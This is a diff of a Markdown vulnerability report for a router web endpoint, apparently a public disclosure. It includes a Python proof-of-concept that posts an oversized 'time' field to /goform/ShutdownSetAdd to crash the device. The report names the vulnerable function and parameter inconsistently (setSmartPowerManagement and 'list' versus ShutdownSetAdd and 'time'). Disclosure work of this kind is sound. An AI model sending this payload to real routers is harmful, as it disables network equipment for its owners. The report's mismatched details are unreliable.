@@ -28,7 +28,7 @@ Attackers can crash the router by sending a malicious request. Below is an examp
 ```python  
 import requests  
 
-url = "http://192.168.85.143/goform/ShutdownSetAdd"  
+url = "http://192.168.0.6/goform/ShutdownSetAdd"  
 data = {  
     'time': 'A' * 10000  # Crafted long data  
 }  
@@ -53,15 +53,16 @@ print(res.content)
 The vulnerability occurs in the `setSmartPowerManagement` function. The program retrieves the user-supplied `list` parameter and stores it in the `__s` variable, then calls the `scanf` function without properly checking the input length, leading to a stack overflow. Below are the relevant code analysis screenshots:  
 ![](file-PizMp6hzXUEz8MhkcvZ1Fz.png)  
     1. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739874862771-b095d510-d6c3-4e2d-9752-65a98310f698.png)  
-    2. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739874822029-93d53994-fdaf-4331-8988-f250de94ccc4.png)  
+    2. ![image](https://github.com/user-attachments/assets/1af7b823-9f7f-43bf-9ab0-511a8adf4e40)
+ 
 2. **Attack Execution Screenshots**:  
 The following screenshots demonstrate the program's output after executing the attack via the command line, showing the crash caused by the stack overflow error.  
 ![](file-M4eTGkAsCUXMxHg8Jn7GfG.png)  
-    1. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739874797959-f70651fc-1225-4be6-8456-30b398c10f1b.png)  
-    2. ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739874802461-8f25b5da-bf8b-4d9c-a38b-422acbee561c.png)  
+    1. ![image](https://github.com/user-attachments/assets/62d07232-f709-44a1-8cda-c07af428b45e)
+
 
 ### Vulnerability Reproduction Proof Video  
-**Baidu Netdisk Video**: [https://pan.baidu.com/s/1k5EVdGBMxD7mUocgk9qHJg?pwd=879](https://pan.baidu.com/s/1k5EVdGBMxD7mUocgk9qHJg?pwd=879p) **(Extraction Code: 879p)**  
+**Baidu Netdisk Video**: [https://pan.baidu.com/s/1_zhGlS0fFhz0Pkh8svljjA?pwd=viwq](https://pan.baidu.com/s/1_zhGlS0fFhz0Pkh8svljjA?pwd=viwq) **(Extraction Code: viwq)**  
 
 ## Vulnerability Location  
 + The vulnerability is located in the `ShutdownSetAdd` function, where the `time` parameter's length is not restricted, resulting in a stack overflow.  
